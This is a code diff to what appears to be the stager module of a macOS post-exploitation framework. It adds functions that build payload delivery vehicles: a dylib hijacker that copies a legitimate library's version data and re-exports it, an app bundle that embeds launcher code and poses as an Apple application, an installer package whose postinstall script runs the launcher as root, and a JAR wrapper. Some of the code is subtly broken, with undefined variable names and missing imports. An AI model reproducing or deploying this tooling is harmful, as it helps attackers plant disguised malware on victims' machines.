@@ -19,6 +19,9 @@ import imp
 import helpers
 import os
 import macholib.MachO
+import shutil
+import zipfile
+import subprocess
 
 
 class Stagers:
@@ -206,3 +209,383 @@ class Stagers:
             return patchedDylib
         else:
             print helpers.color("[!] Unable to patch dylib")
+
+    def generate_dylibHijacker(self, attackerDylib, targetDylib, LegitDylibLocation):
+
+        LC_HEADER_SIZE = 0x8
+
+        def checkPrereqs(attackerDYLIB, targetDYLIB):
+
+            if not os.path.exists(targetDYLIB):
+
+                print helpers.color("[!] Path for legitimate dylib is not valid")
+                return False
+
+            attacker = open(attackerDYLIB, 'rb')
+            target = open(targetDYLIB, 'rb')
+            attackDylib = macholib.MachO.MachO(attacker.name)
+            targetDylib = macholib.MachO.MachO(target.name)
+
+            if attackDylib.headers[0].header.cputype != targetDylib.headers[0].header.cputype:
+                print helpers.color("[!] Architecture mismatch!")
+                return False 
+
+            return True
+
+        def findLoadCommand(fileHandle, targetLoadCommand):
+            #print helpers.color("In findLoadCommand function")
+            #offset of matches load commands
+            matchedOffsets = []
+
+            try:
+                macho = macholib.MachO.MachO(fileHandle.name)
+                if macho:
+                    for machoHeader in macho.headers:
+                        fileHandle.seek(machoHeader.offset, io.SEEK_SET)
+                        fileHandle.seek(machoHeader.mach_header._size_, io.SEEK_CUR)
+                        loadCommands = machoHeader.commands
+
+                        for loadCommand in loadCommands:
+
+                            if targetLoadCommand == loadCommand[0].cmd:
+                                matchedOffsets.append(fileHandle.tell())
+
+                            fileHandle.seek(loadCommand[0].cmdsize, io.SEEK_CUR)
+            except Exception, e:
+                raise e
+                matchedOffsets = None
+
+            return matchedOffsets
+
+        def configureVersions(attackerDylib, targetDylib):
+            #print helpers.color("In configureVersions function")
+            try:
+                fileHandle = open(targetDylib, 'rb+')
+
+                versionOffsets = findLoadCommand(fileHandle, macholib.MachO.LC_ID_DYLIB)
+                if not versionOffsets or not len(versionOffsets):
+                    return False
+
+                fileHandle.seek(versionOffsets[0], io.SEEK_SET)
+                fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)
+
+                #extract current version
+                currentVersion = fileHandle.read(4)
+
+                #extract compatibility version
+                compatibilityVersion = fileHandle.read(4)
+
+                fileHandle.close()
+
+                fileHandle = open(attackerDYLIB, 'rb+')
+
+                versionOffsets = findLoadCommand(fileHandle, macholib.MachO.LC_ID_DYLIB)
+
+                if not versionOffsets or not len(versionOffsets):
+                    return False
+
+                for versionOffset in versionOffsets:
+
+                    fileHandle.seek(versionOffset, io.SEEK_SET)
+
+                    fileHandle.seek(LC_HEADER_SIZE+0x8, io.SEEK_CUR)
+
+                    #set current version
+                    fileHandle.write(currentVersion)
+
+                    #set compatability version
+                    fileHandle.write(compatibilityVersion)
+
+                fileHandle.close()
+
+            except Exception, e:
+                raise e
+
+            return True
+
+        def configureReExport(attackerDylib, targetDylib, LegitDylibLocation):
+            
+            try:
+                fileHandle = open(attackerDylib,'rb+')
+
+                reExportOffsets = findLoadCommand(fileHandle, macholib.MachO.LC_REEXPORT_DYLIB)
+
+                if not reExportOffsets or not len(reExportOffsets):
+                    return False
+
+                for reExportOffset in reExportOffsets:
+
+                    fileHandle.seek(reExportOffset, io.SEEK_SET)
+                    fileHandle.seek(0x4, io.SEEK_CUR)
+
+                    commandSize = struct.unpack('<L', fileHandle.read(4))[0]
+                    pathOffset = struct.unpack('<L', fileHandle.read(4))[0]
+
+                    fileHandle.seek(reExportOffset + pathOffset, io.SEEK_SET)
+                    pathSize = commandSize - (fileHandle.tell() - reExportOffset)
+
+                    data = LegitDylibLocation + '\\0' * (pathSize - len(LegitDylibLocation))
+                    fileHandle.write(data)
+                    fileHandle.close()
+
+            except Exception, e:
+                raise e
+                return False
+
+            return True
+
+        def configure(attackerDylib, targetDylib, LegitDylibLocation):
+            #print helpers.color("In configure function")
+            if not configureVersions(attackerDylib, targetDylib):
+                return False
+
+            if not configureReExport(attackerDylib, targetDylib, LegitDylibLocation):
+                return False
+
+            return True 
+
+        if not checkPrereqs(attackerDYLIB, targetDYLIB):
+            return ""
+        if not configure(attackerDylib, targetDylib, LegitDylibLocation):
+            return ""
+
+        hijacker = open(attackerDylib,'rb')
+        hijackerBytes = hijacker.read()
+        hijacker.close()
+        return hijackerBytes
+
+    def generate_appbundle(self, launcherCode, Arch, icon, AppName, disarm):
+
+        """
+        Generates an application. The embedded executable is a macho binary with the python interpreter.
+        """
+
+        
+
+        MH_EXECUTE = 2
+
+        if Arch == 'x64':
+
+            f = open(self.mainMenu.installPath + "/data/misc/apptemplateResources/x64/launcher.app/Contents/MacOS/launcher")
+            directory = self.mainMenu.installPath + "/data/misc/apptemplateResources/x64/launcher.app/"
+        else:
+            f = open(self.mainMenu.installPath + "/data/misc/apptemplateResources/x86/launcher.app/Contents/MacOS/launcher")
+            directory = self.mainMenu.installPath + "/data/misc/apptemplateResources/x86/launcher.app/"
+
+        macho = macholib.MachO.MachO(f.name)
+
+        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
+            print helpers.color("[!] Macho binary template is not the correct filetype")
+            return ""
+
+        cmds = macho.headers[0].commands
+
+        for cmd in cmds:
+            count = 0
+            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
+                count += 1
+                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
+                    count += 1
+                    for section in cmd[count]:
+                        if section.sectname.strip('\x00') == '__cstring':
+                            offset = int(section.offset)
+                            placeHolderSz = int(section.size) - 52
+
+        template = f.read()
+        f.close()
+
+        if placeHolderSz and offset:
+
+            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
+            patchedBinary = template[:offset]+launcher+template[(offset+len(launcher)):]
+            if AppName == "":
+                AppName = "launcher"
+
+            tmpdir = "/tmp/application/%s.app/" % AppName
+            shutil.copytree(directory, tmpdir)
+            f = open(tmpdir + "Contents/MacOS/launcher","wb")
+            if disarm != True:
+                f.write(patchedBinary)
+                f.close()
+            else:
+                t = open(self.mainMenu.installPath+"/data/misc/apptemplateResources/empty/macho",'rb')
+                w = t.read()
+                f.write(w)
+                f.close()
+                t.close()
+
+            os.rename(tmpdir + "Contents/MacOS/launcher",tmpdir + "Contents/MacOS/%s" % AppName)
+            os.chmod(tmpdir+"Contents/MacOS/%s" % AppName, 0755)
+
+            if icon != '':
+                iconfile = os.path.splitext(icon)[0].split('/')[-1]
+                shutil.copy2(icon,tmpdir+"Contents/Resources/"+iconfile+".icns")
+            else:
+                iconfile = icon
+            appPlist = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>BuildMachineOSBuild</key>
+    <string>15G31</string>
+    <key>CFBundleDevelopmentRegion</key>
+    <string>en</string>
+    <key>CFBundleExecutable</key>
+    <string>%s</string>
+    <key>CFBundleIconFile</key>
+    <string>%s</string>
+    <key>CFBundleIdentifier</key>
+    <string>com.apple.%s</string>
+    <key>CFBundleInfoDictionaryVersion</key>
+    <string>6.0</string>
+    <key>CFBundleName</key>
+    <string>%s</string>
+    <key>CFBundlePackageType</key>
+    <string>APPL</string>
+    <key>CFBundleShortVersionString</key>
+    <string>1.0</string>
+    <key>CFBundleSignature</key>
+    <string>????</string>
+    <key>CFBundleSupportedPlatforms</key>
+    <array>
+        <string>MacOSX</string>
+    </array>
+    <key>CFBundleVersion</key>
+    <string>1</string>
+    <key>DTCompiler</key>
+    <string>com.apple.compilers.llvm.clang.1_0</string>
+    <key>DTPlatformBuild</key>
+    <string>7D1014</string>
+    <key>DTPlatformVersion</key>
+    <string>GM</string>
+    <key>DTSDKBuild</key>
+    <string>15E60</string>
+    <key>DTSDKName</key>
+    <string>macosx10.11</string>
+    <key>DTXcode</key>
+    <string>0731</string>
+    <key>DTXcodeBuild</key>
+    <string>7D1014</string>
+    <key>LSApplicationCategoryType</key>
+    <string>public.app-category.utilities</string>
+    <key>LSMinimumSystemVersion</key>
+    <string>10.11</string>
+    <key>LSUIElement</key>
+    <true/>
+    <key>NSHumanReadableCopyright</key>
+    <string>Copyright 2016 Apple. All rights reserved.</string>
+    <key>NSMainNibFile</key>
+    <string>MainMenu</string>
+    <key>NSPrincipalClass</key>
+    <string>NSApplication</string>
+</dict>
+</plist>
+""" % (AppName, iconfile, AppName, AppName)
+            f = open(tmpdir+"Contents/Info.plist", "w")
+            f.write(appPlist)
+            f.close()
+
+            shutil.make_archive("/tmp/launcher", 'zip', "/tmp/application")
+            shutil.rmtree('/tmp/application')
+
+            f = open("/tmp/launcher.zip","rb")
+            zipbundle = f.read()
+            f.close()
+            os.remove("/tmp/launcher.zip")
+            return zipbundle
+        
+            
+        else:
+            print helpers.color("[!] Unable to patch application")
+
+    def generate_pkg(self, launcher, bundleZip, AppName):
+
+        #unzip application bundle zip. Copy everything for the installer pkg to a temporary location
+        currDir = os.getcwd()
+        os.chdir("/tmp/")
+        f = open("app.zip","wb")
+        f.write(bundleZip)
+        f.close()
+        zipf = zipfile.ZipFile('app.zip','r')
+        zipf.extractall()
+        zipf.close()
+        os.remove('app.zip')
+
+        os.system("cp -r "+self.mainMenu.installPath+"/data/misc/pkgbuild/ /tmp/")
+        os.chdir("pkgbuild")
+        os.system("cp -r ../"+AppName+".app root/Applications/")
+        os.system("chmod +x root/Applications/")
+        os.system("( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload")
+        os.system("chmod +x expand/Payload")
+        s = open('scripts/postinstall','r+')
+        script = s.read()
+        script = script.replace('LAUNCHER',launcher)
+        s.seek(0)
+        s.write(script)
+        s.close()
+        os.system("( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts")
+        os.system("chmod +x expand/Scripts")
+        numFiles = subprocess.check_output("find root | wc -l",shell=True).strip('\n')
+        size = subprocess.check_output("du -b -s root",shell=True).split('\t')[0]
+        size = int(size) / 1024
+        p = open('expand/PackageInfo','w+')
+        pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
+<pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
+    <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
+    <bundle path="./APPNAME.app" id="com.apple.APPNAME" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
+    <bundle-version>
+        <bundle id="com.apple.APPNAME"/>
+    </bundle-version>
+    <upgrade-bundle>
+        <bundle id="com.apple.APPNAME"/>
+    </upgrade-bundle>
+    <update-bundle/>
+    <atomic-update-bundle/>
+    <strict-identifier>
+        <bundle id="com.apple.APPNAME"/>
+    </strict-identifier>
+    <relocate>
+        <bundle id="com.apple.APPNAME"/>
+    </relocate>
+    <scripts>
+        <postinstall file="./postinstall"/>
+    </scripts>
+</pkg-info>
+"""
+        pkginfo = pkginfo.replace('APPNAME',AppName)
+        pkginfo = pkginfo.replace('KEY1',numFiles)
+        pkginfo = pkginfo.replace('KEY2',str(size))
+        p.write(pkginfo)
+        p.close()
+        os.system("mkbom -u 0 -g 80 root expand/Bom")
+        os.system("chmod +x expand/Bom")
+        os.system("chmod -R 755 expand/")
+        os.system('( cd expand && xar --compression none -cf "../launcher.pkg" * )')
+        f = open('launcher.pkg','rb')
+        package = f.read()
+        os.chdir("/tmp/")
+        shutil.rmtree('pkgbuild')
+        shutil.rmtree(AppName+".app")
+        return package
+
+    def generate_jar(self, launcherCode):
+        file = open(self.mainMenu.installPath+'/data/misc/Run.java','r')
+        javacode = file.read()
+        file.close()
+        javacode = javacode.replace("LAUNCHER",launcherCode)
+        file = open(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.java','w')
+        file.write(javacode)
+        file.close()
+        currdir = os.getcwd()
+        os.chdir(self.mainMenu.installPath+'data/misc/classes/')
+        os.system('javac com/installer/apple/Run.java')
+        os.system('jar -cvfm '+self.mainMenu.installPath+'Run.jar ../Manifest.txt com/installer/apple/Run.class')
+        os.chdir(currdir)
+        os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.class')
+        os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.java')
+        jarfile = open('Run.jar','rb')
+        jar = jarfile.read()
+        jarfile.close()
+        os.remove('Run.jar')
+
+        return jar 
